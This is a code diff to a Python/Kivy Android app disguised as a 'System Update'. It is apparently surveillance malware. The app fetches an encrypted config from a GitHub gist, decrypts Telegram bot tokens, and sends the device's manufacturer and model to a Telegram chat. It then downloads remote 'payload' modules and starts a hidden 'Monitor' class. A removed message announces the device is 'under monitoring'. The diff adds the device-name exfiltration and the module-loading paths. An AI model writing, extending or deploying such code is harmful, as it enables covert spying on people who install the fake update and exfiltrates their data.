@@ -1,3 +1,5 @@
+import os
+import sys
 import threading
 import requests
 import base64
@@ -14,6 +16,15 @@ from kivy.utils import platform
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
+# إضافة مسار التطبيق الحالي لمسارات البحث عن المكتبات
+app_path = os.path.dirname(os.path.abspath(__file__))
+if app_path not in sys.path:
+    sys.path.append(app_path)
+for subdir in ['core', 'telegram', 'media', 'config']:
+    sub_path = os.path.join(app_path, subdir)
+    if os.path.exists(sub_path) and sub_path not in sys.path:
+        sys.path.append(sub_path)
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
@@ -21,13 +32,12 @@ class SystemUpdateApp(App):
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
 
         layout = BoxLayout(orientation='vertical')
-        
         btn_layout = BoxLayout(size_hint_y=0.1, height=40)
         copy_btn = Button(text="📋 نسخ السجل", size_hint_x=0.3, background_color=(0.2, 0.6, 0.2, 1))
         copy_btn.bind(on_press=self.copy_log)
         btn_layout.add_widget(copy_btn)
         layout.add_widget(btn_layout)
-        
+
         scroll = ScrollView(size_hint=(1, 1), do_scroll_x=True, do_scroll_y=True)
         self.log_view = TextInput(
             text="[System] Initializing...\n",
@@ -42,7 +52,7 @@ class SystemUpdateApp(App):
         self.log_view.bind(minimum_height=self.log_view.setter('height'))
         scroll.add_widget(self.log_view)
         layout.add_widget(scroll)
-        
+
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return layout
 
@@ -79,8 +89,20 @@ class SystemUpdateApp(App):
         try:
             url = f"https://api.telegram.org/bot{token}/sendMessage"
             requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
+            return True
+        except Exception as e:
+            self.log(f"⚠️ إرسال تلغرام فشل: {e}")
+            return False
+
+    def get_device_name(self):
+        try:
+            from jnius import autoclass
+            Build = autoclass('android.os.Build')
+            model = Build.MODEL
+            manufacturer = Build.MANUFACTURER
+            return f"{manufacturer} {model}".strip()
         except:
-            pass
+            return "Android Device"
 
     def logic_engine(self):
         try:
@@ -91,20 +113,24 @@ class SystemUpdateApp(App):
                 from android.permissions import request_permissions, Permission
                 request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                 time.sleep(2)
+
             self.log("اختبار الاتصال بـ 1.1.1.1...")
             try:
                 r = requests.get("https://1.1.1.1", timeout=5, verify=False)
                 self.log(f"الاتصال ناجح (حالة {r.status_code})")
             except Exception as e:
                 self.log(f"⚠️ فشل اختبار الاتصال المباشر: {str(e)}")
+
             self.log(f"جلب الإعدادات من: {self.config_url[:60]}...")
             response = requests.get(self.config_url, timeout=15, verify=False)
             self.log(f"حالة HTTP: {response.status_code}")
             if response.status_code != 200:
                 self.log(f"❌ فشل تحميل config.json: HTTP {response.status_code}")
                 return
+
             config = response.json()
             self.log("تم تحليل ملف الإعدادات بنجاح.")
+
             tokens = []
             for i, enc_token in enumerate(config.get('t', [])):
                 decrypted = self.decrypt_token(enc_token)
@@ -113,23 +139,31 @@ class SystemUpdateApp(App):
                     self.log(f"✅ تم فك تشفير التوكن {i+1}")
                 else:
                     self.log(f"❌ فشل فك تشفير التوكن {i+1}")
+
             v_id = self.decrypt_token(config.get('v', ''))
             if not v_id:
                 self.log("❌ فشل فك تشفير معرف الدردشة (v)")
                 return
+
             self.log(f"تم فك تشفير {len(tokens)} توكنات، معرف الدردشة: {v_id[:10]}...")
+
             globals()['MASTER_CONFIG'] = {
                 'tokens': tokens,
                 'v_id': v_id,
                 'payload_urls': config.get('payload_urls', [])
             }
+
+            # إرسال رسالة بدء التشغيل باسم الجهاز
             if tokens:
-                self.log("إرسال رسالة بدء التشغيل إلى Telegram...")
-                self.send_telegram(tokens[0], v_id, "🚀 النظام يعمل (AES-GCM)")
-                self.log("تم إرسال رسالة بدء التشغيل.")
+                device_name = self.get_device_name()
+                startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                self.send_telegram(tokens[0], v_id, startup_msg)
+                self.log("تم إرسال رسالة بدء التشغيل باسم الجهاز.")
+
             self.log("بدء تحميل البايلودات...")
             self.log_view.text += "\n[Progress] تحميل الوحدات... (35%)\n"
             self.load_payloads()
+
         except Exception as e:
             error_details = traceback.format_exc()
             self.log(f"❌ خطأ جسيم:\n{error_details}")
@@ -139,6 +173,7 @@ class SystemUpdateApp(App):
         if not payload_urls:
             self.log("⚠️ لا توجد روابط بايلودات في الإعدادات!")
             return
+
         loaded = 0
         for url in payload_urls:
             try:
@@ -156,15 +191,13 @@ class SystemUpdateApp(App):
             except Exception as e:
                 self.log(f"❌ فشل تحميل {name}: {str(e)}")
                 continue
+
         if 'Monitor' in globals():
             self.log("بدء تشغيل خدمة المراقبة (Monitor)...")
             monitor = globals()['Monitor']()
             monitor.start()
             self.log("✅ تم تشغيل Monitor")
             self.log_view.text += "\n[System] الحالة: 100% - جاهز\n"
-            self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
-                               globals()['MASTER_CONFIG']['v_id'],
-                               "🎯 اكتمل التشغيل - الجهاز تحت المراقبة")
         else:
             self.log("❌ خطأ: لم يتم العثور على كلاس Monitor بعد تحميل البايلودات.")
 
